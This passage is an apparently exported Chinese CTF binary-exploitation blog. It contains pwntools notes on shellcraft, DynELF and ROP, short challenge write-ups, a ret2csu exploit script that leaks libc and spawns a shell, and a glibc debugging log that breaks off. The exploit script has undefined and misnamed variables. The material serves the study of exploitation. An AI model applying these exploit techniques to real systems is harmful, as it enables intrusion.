汇编与反汇编，支持x86/x64/arm/mips/power pc等基本上所有的主流平台</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">asm(shellcraft.sh())</span><br><span class=\"line\">shellcraft.amd64.sh()</span><br></pre></td></tr></table></figure>\n\n\n\n<h6 id=\"2）dynelf\"><a href=\"#2）dynelf\" class=\"headerlink\" title=\"2）dynelf\"></a>2）dynelf</h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#example:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>():</span></span><br><span class=\"line\">  payload = p64(addr)</span><br><span class=\"line\">  p.send(payload)</span><br><span class=\"line\">  data = p.recv()</span><br><span class=\"line\">  log.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">   <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\">system  = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h6 id=\"3）gdb\"><a href=\"#3）gdb\" class=\"headerlink\" title=\"3）gdb\"></a>3）gdb</h6><p> : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT</p>\n<h6 id=\"5）memleak\"><a href=\"#5）memleak\" class=\"headerlink\" title=\"5）memleak\"></a>5）memleak</h6><p>: 用于内存泄漏</p>\n<h6 id=\"5）rop\"><a href=\"#5）rop\" class=\"headerlink\" title=\"5）rop\"></a>5）rop</h6><p>【<a href=\"https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation%E3%80%91\">https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">In [59]: rop.</span><br><span class=\"line\">rop.base                   rop.elfs                   rop.leave                  rop.resolve</span><br><span class=\"line\">rop.build                  rop.find_gadget            rop.migrate                rop.search</span><br><span class=\"line\">rop.call                   rop.find_stack_adjustment  rop.migrated               rop.search_iter</span><br><span class=\"line\">rop.chain                  rop.from_blob              rop.pivots                 rop.setRegisters</span><br><span class=\"line\">rop.describe               rop.gadgets                rop.raw                    rop.unresolve</span><br><span class=\"line\">rop.dump                   rop.generatePadding        rop.regs                   </span><br></pre></td></tr></table></figure>\n\n<p><code>rop = ROP（&#39;main&#39;)</code></p>\n<p><code>ROP([ELF(&#39;./main&#39;)])</code>创建rop对象</p>\n<p><code>rop.raw</code>:添加数据</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rop.raw(b<span class=\"string\">&quot;a&quot;</span>*10)</span><br></pre></td></tr></table></figure>\n\n<p><code>rop.dump</code>会将已经构建的栈数据输出,而且方便阅读</p>\n<p><code>rop.call</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rop.call(<span class=\"string\">&#x27;read&#x27;</span>,[1,2,3])</span><br><span class=\"line\"><span class=\"built_in\">print</span> rop.dump()</span><br><span class=\"line\">0x0000:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaaaa&#x27;</span></span><br><span class=\"line\">0x0004:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">0x0008:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">0x000c:        0x80483a0 <span class=\"built_in\">read</span>(1, 2, 3)</span><br><span class=\"line\">0x0010:           <span class=\"string\">&#x27;eaaa&#x27;</span> &lt;<span class=\"built_in\">return</span> address&gt;</span><br><span class=\"line\">0x0014:              0x1 arg0</span><br><span class=\"line\">0x0018:              0x2 arg1</span><br><span class=\"line\">0x001c:              0x3 arg2</span><br></pre></td></tr></table></figure>\n\n<p>第一个参数为目标函数符号名,第二个参数是个list,作为目标函数的参数.然后构建出数据拼接到已有的数据中<br>或者使用rop.read(1,2,3):效果和call一样.细心点可以发现前一个read后的返回地址改成了栈调整的数据.rop模块会自动寻找gadget来连接上2次功能调用</p>\n<p><code>rop.migrate</code>括号直接接地址。</p>\n<p>具体操作</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#rop.migrate(2)</span></span><br><span class=\"line\"><span class=\"comment\">#print rop.dump()</span></span><br><span class=\"line\">0x0034:        0x804861b pop ebp; ret</span><br><span class=\"line\">0x0038:             -0x2</span><br><span class=\"line\">0x003c:        0x8048458 leave; ret</span><br></pre></td></tr></table></figure>\n\n<p>相当于自动化地实现了栈迁移。（pwntools yyds）</p>\n<p><code>rop.chain</code>返回当前所有rop chain的shellcode值。</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"ida的结构体识别","url":"/2022/03/17/ida%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E8%AF%86%E5%88%AB/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-nMVHHHMB\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"0\"><a href=\"#0\" class=\"headerlink\" title=\"0\"></a>0</h4><p>​        最近发现做堆题最慢的不是调试，而是在逆向的过程中寻找思路，而一般堆题的菜单都是由结构体管理，所以如果能在ida中快速方便地查看结构体相关的指针操作就再好不过了。然而一般来说ida是无法直接识别结构体这种比较高级的数据结构的，所以需要我们手动去创建并修改。</p>\n<h4 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h4><p>​        首先可以在ida<code>structures</code>的界面手动添加一些结构体<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%888.35.57.png\" alt=\"截屏2022-03-17 下午8.35.57\"></p>\n<p>​        右键空白处，选择<code>add struct type</code>，便可以新建结构体。鼠标选中ends字段，按下D可以新建字段，在当前字段再按下D可以调整字段长度。</p>\n<p>​        </p>\n<h5 id=\"为反汇编代码添加结构体\"><a href=\"#为反汇编代码添加结构体\" class=\"headerlink\" title=\"为反汇编代码添加结构体\"></a>为反汇编代码添加结构体</h5><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.28.06.png\" alt=\"截屏2022-03-18 上午11.28.06\"></p>\n<p>​        </p>\n<p>​        随便一道堆题，逻辑比较简单，几个对于字段的处理都比较直观，所以可以较为清楚地知道head结构体中的字段，然后右键head创建结构体，        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.32.26.png\" alt=\"截屏2022-03-18 上午11.32.26\"></p>\n<p>然后按照实际情况调整。</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"search engine","url":"/2022/03/18/week-4.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-XphQSCck\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>​    overview</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.00.02.png\" alt=\"截屏2022-03-18 下午9.00.02\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.02.53.png\" alt=\"截屏2022-03-18 下午9.02.53\"></p>\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>​        菜单中的功能比较少，但是比较奇怪。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.37.06.png\" alt=\"截屏2022-03-18 下午9.37.06\"></p>\n<h4 id=\"searche-word\"><a href=\"#searche-word\" class=\"headerlink\" title=\"searche word\"></a>searche word</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.45.44.png\" alt=\"截屏2022-03-18 下午9.45.44\"></p>\n<p>​        这个函数大致实现了一个“查找”word，如果找到则输出，并选择是否将其删除。</p>\n<p>​        </p>\n<p>​    </p>\n","categories":["HEAP - Fastbin Attack"],"tags":["UAF"]},{"title":"PicoCTF_2018_got-shell","url":"/2022/03/20/PicoCTF_2018_got-shell/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ESAjXxBS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"PicoCTF-2018-got-shell\"><a href=\"#PicoCTF-2018-got-shell\" class=\"headerlink\" title=\"PicoCTF_2018_got-shell\"></a>PicoCTF_2018_got-shell</h4><p>​        虽然但是，这个题为什么这么pwncollege。guide的风格，函数的名字。。。完全一致好吧。</p>\n<p>​        可以写4字节，正好可以修改got表为后门函数。那就修改puts咯？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png\" alt=\"截屏2022-03-16 下午9.16.16\"></p>\n","categories":["STACK - OTHERS"],"tags":["EZ_STACK"]},{"title":"mrctf2020_shellcode_revenge","url":"/2022/03/20/mrctf2020_shellcode_revenge/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-InbmPiox\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"mrctf2020-shellcode-revenge\"><a href=\"#mrctf2020-shellcode-revenge\" class=\"headerlink\" title=\"mrctf2020_shellcode_revenge\"></a>mrctf2020_shellcode_revenge</h3><h4 id=\"overview\"><a href=\"#overview\" class=\"headerlink\" title=\"overview\"></a>overview</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.33.15.png\" alt=\"截屏2022-03-19 下午4.33.15\"></p>\n<p>看起来像ret2shellcode。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.36.32.png\" alt=\"截屏2022-03-19 下午4.36.32\"></p>\n<h4 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h4><p>​        不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较，<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.00.43.png\" alt=\"截屏2022-03-19 下午5.00.43\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.52.21.png\" alt=\"截屏2022-03-19 下午4.52.21\"></p>\n<p>​        分析一下这个流程图，我们的目的是执行<code>loc_1236</code>，一共有三个箭头指向它，归纳以后分别是<code>(0x60,0x7A)</code>,<code>(0x2f,0x5A)</code>,ascii在这些范围内的字符会被读入buf，然后<code>call rax</code>，也就是执行了我们输入的shellcode。</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>​        由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。</p>\n<p>​        所以把shellcode转换成这些范围内的字符，然后直接传输就行。</p>\n<p>​        </p>\n","categories":["STACK - Stack Overflow"],"tags":["EZ_STACK"]},{"title":"jarvisoj_level5","url":"/2022/03/20/ret2csu/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-VekkgKmD\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"jarvisoj-level5\"><a href=\"#jarvisoj-level5\" class=\"headerlink\" title=\"jarvisoj_level5\"></a>jarvisoj_level5</h4><p>​        这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;&quot;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = <span class=\"number\">0x88</span><span class=\"comment\">#(test)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x400690</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x4006AA</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * offset </span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * (offset - <span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class=\"line\"><span class=\"string\">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">log.success(&#x27;system_addr &#x27; + hex(system_addr))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">p.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["STACK - Stack Overflow"],"tags":["ret2csu"]},{"title":"记一次ubuntu18.04的glibc调教","url":"/2021/08/16/%E8%AE%B0%E4%B8%80%E6%AC%A1ubuntu18.04%E7%9A%84glibc%E8%B0%83%E6%95%99/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-OkYnucNG\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"1）概述\"><a href=\"#1）概述\" class=\"headerlink\" title=\"1）概述\"></a>1）概述</h4><p>这是一件悲伤的事情，我的ubuntu它又崩了。</p>\n<p>最开始的时候，发现pwndbg无法查看heap等信息，这个问题我之前也遇到过，但是情况有非常大的区别。</p>\n<p>之前是我2.32的本地默认libc，执行程序时加载2.23，然后因为指定的lbc-2.23.so没有附带调试符号信息，所以也看不了heap，但是这一次，本机都看不了了？</p>\n<p>经过一番排查，我们认为是libc本身出现了问题。然后寻找libc-2.27.so的文件打算一探究竟，但找到本应该储存着它的文件夹时，惊奇地发现它居然从文件夹中消失了。</p>\n<p>它并不是无缘无故消失的，我大致分析了一下原因。之前我做题时试图切换libc版本，然后在镜像站下载了（应该）带调试符号的libc-2.27.so。但是并不是很清楚，所以喊来了pwn爷爷，pwn爷爷并不熟悉我的电脑，一通操作猛如虎，干了啥我也不知道，反正好像是把libc丢进了根目录。</p>\n<p>可能就是在那会儿，新下载的libc和已有的libc产生了冲突，然后启动了什么奇怪的过程，把libc彻底搞崩了。</p>\n<p>但是这个pwn大哥完全没锅，因为挺有趣的其实。</p>\n<p>然后大致明了的问题的方向我开始寻找解决方案。</p>\n<p>虽然pwn大哥不费吹灰之力帮我重新装了一个系统并且完善好了环境，但是还有一个报废的系统等着我蹂躏呢（）</p>\n<h3 id=\"2-record\"><a href=\"#2-record\" class=\"headerlink\" title=\"2)record\"></a>2)record</h3><p>记录一下所有调教的操作。</p>\n<ol>\n<li>普通地在/usr/lib/x86_64-linux-gnu文件夹中添加ld，无效。</li>\n<li>普通地在/usr/lib/x86_64-linux-gnu文件夹中添加带有调试符号的libc，无效。</li>\n</ol>\n<p>等等为什么ld和libc都没了。。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg: created $rebase, $<span class=\"function\">ida gdb <span class=\"title\">functions</span> <span class=\"params\">(can be used with print/<span class=\"keyword\">break</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">Reading symbols from ./worldline...done.</span></span><br><span class=\"line\"><span class=\"function\">Attaching to program: /home/fur1n/pwn/heap/merely_game/wordline/worldline, process 12250</span></span><br><span class=\"line\"><span class=\"function\">Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...</span></span><br><span class=\"line\"><span class=\"function\">warning: the debug information found in &quot;/usr/lib/debug<span class=\"comment\">//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>好嘛。</p>\n<blockquote>\n<h6 id=\"About-CRC-Errors\"><a href=\"#About-CRC-Errors\" class=\"headerlink\" title=\"About CRC Errors\"></a>About CRC Errors</h6><p>A CRC error indicates that some data in your Zip file (.zip or .zipx) is damaged. CRC stands for <strong>cyclic redundancy check</strong>. It is a calculation made from all the data in a file to insure accuracy. When you add a file to a Zip file, WinZip calculates a CRC value for the file and saves the value in the Zip file. When you later extract the file from the Zip file, WinZip calculates the CRC of the extracted file and compares it to the value stored when the file was zipped. If these two CRC values do not match, the file that was extracted does not match the original file, and WinZip will display a <strong>CRC Error</strong> message.</p>\n<p>When the data in a Zip file is damaged, it may not be possible to extract all of the files from the Zip file correctly. Damaged data can affect the entire Zip file, multiple files, or just one file.</p>\n</blockquote>\n<p>crc的官方定义是文件被损坏导致错误，但是实际并没有损坏。。感觉并不是可以随便解决的问题</p>\n<p>​      3.替换libc.so.6文件。他不是不匹配嘛，不匹配我就弄个匹配的。结果无效。</p>\n<p>查了一下，查出一堆奇怪的问题。网上大多都是完全无法调试，但是我这就很离谱。</p>\n<p>难道只能硬啃那个又臭又长的gdb的文档吗？</p>\n<p><a href=\"https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html\">18.3 Debugging Information in Separate Files</a></p>\n<blockquote>\n<p>GDB supports two ways of specifying the separate debug info file:</p>\n<ul>\n<li>The executable contains a <em>debug link</em> that specifies the name of the separate debug info file. The separate debug file’s name is usually executable.debug, where executable is the name of the corresponding executable file without leading directories (e.g., ls.debug for /usr/bin/ls). In addition, the debug link specifies a 32-bit <em>Cyclic Redundancy Check</em> (CRC) checksum for the debug file, which GDB uses to validate that the executable and the debug file came from the same build.</li>\n<li>The executable contains a <em>build ID</em>, a unique bit string that is also present in the corresponding debug info file. (This is supported only on some operating systems, when using the ELF or PE file formats for binary files and the GNU Binutils.) For more details about this feature, see the description of the –build-id command-line option in <a href=\"http://sourceware.org/binutils/docs/ld/Options.html#Options\">Command Line Options</a> in The GNU Linker. The debug info file’s name is not specified explicitly by the build ID, but can be computed from the build ID, see below.</li>\n</ul>\n</blockquote>\n<p>在某些系统中（比如我们的ubunut），由于调试文件可能比可执行程序都大，所以通常将可执行文件以及调试文件分开存放。一般来说调试信息</p>\n<p>的后缀是<code>.debug</code>。</p>\n<p>gdb支持两种寻找调试info文件的方式。</p>\n<p>一种是可执行文件包含指向调试信息文件的路径。就比如ls在<code> /usr/bin/ls)</code>中，同时这个文件夹还包含<code>ls.debug</code>文件。</p>\n<p>然后调试链接器还通过crc检查来使来源于同一个编译的可执行文件和调试文件生效。</p>\n<p>此外还有就是通过匹配build ID来指定。关于build ID，这个确实是有的。</p>\n<p>然后当可执行文件已经指定好调试文件，gdb还需要去寻找它。就像小张跟小静说我要找小王，小静只是知道他需要找到小王，但是还不知道怎么找。</p>\n<blockquote>\n<p>Depending on the way the debug info file is specified, GDB uses two different methods of looking for the debug file:</p>\n<ul>\n<li>For the “debug link” method, GDB looks up the named file in the directory of the executable file, then in a subdirectory of that directory named .debug, and finally under each one of the global debug directories, in a subdirectory whose name is identical to the leading directories of the executable’s absolute file name. (On MS-Windows/MS-DOS, the drive letter of the executable’s leading directories is converted to a one-letter subdirectory, i.e. d:/usr/bin/ is converted to /d/usr/bin/, because Windows filesystems disallow colons in file names.)</li>\n<li>For the “build ID” method, GDB looks in the .build-id subdirectory of each one of the global debug directories for a file named nn/nnnnnnnn.debug, where nn are the first 2 hex characters of the build ID bit string, and nnnnnnnn are the rest of the bit string. (Real build ID strings are 32 or more hex characters, not 10.)</li>\n</ul>\n<p>So, for example, suppose you ask GDB to debug /usr/bin/ls, which has a debug link that specifies the file ls.debug, and a build ID whose value in hex is <code>abcdef1234</code>. If the list of the global debug directories includes /usr/lib/debug, then GDB will look for the following debug information files, in the indicated order:</p>\n<ul>\n<li>- /usr/lib/debug/.build-id/ab/cdef1234.debug</li>\n<li>- /usr/bin/ls.debug</li>\n<li>- /usr/bin/.debug/ls.debug</li>\n<li>- /usr/lib/debug/usr/bin/ls.debug.</li>\n</ul>\n</blockquote>\n<p>一个就是普通的在子目录中寻找对应的文件，</p>\n<p>另外一个根据build ID，在名为<code>.build-id</code>的子目录中寻找build ID对应的文件夹。</p>\n<p>也就是说如果要调试<code> /usr/bin/ls</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/lib/debug/.build-id/ab/cdef1234.debug</span><br><span class=\"line\">/usr/bin/ls.debug</span><br><span class=\"line\">/usr/bin/.debug/ls.debug</span><br><span class=\"line\">/usr/lib/debug/usr/bin/ls.debug.</span><br></pre></td></tr></table></figure>\n\n<p>这四种路径都能帮助gdb找到对应的调试文件。</p>\n<p>所以无论如何实际上没有解决任何问题。比如我找到的在stackoverflow上的相同报错，基本上都是在对应文件夹中缺少他编译文件的<code>.debug</code>文件，但是这个和我感觉咩有关系。因为感觉libc这种本来就是咩有debug文件的。。。。</p>\n<p>网上也一会儿找不到和我相同的情况。好离谱</p>\n<p>我只能暂且顺着这个思路走一走，看看能不能添加什么<code>libc-2.27.so</code>的debug文件。但是好奇怪，就算缺少也应该是我们需要调试的程序缺少调试文件，为什么是libc缺少调试文件，难道我们调的不是程序而是libc？</p>\n<p>就跟之前我看那个源码级调试堆题，給的源码也是malloc的源码。</p>\n<p>对了，18.04的应该是把debug信息一起整合到了一个叫debug的文件夹里<code>/usr/lib/debug</code></p>\n<p>里面感觉和libc如出一撤，所以我才猜测这就是对应的所谓的调试信息。</p>\n<p>然后检查发现都比较完善，没有缺少什么。</p>\n<p>这就很怪了。</p>\n<p>想一下，之前报错就是说libc.so.6和libc的调试文件不匹配</p>\n<figure class=\"highlight 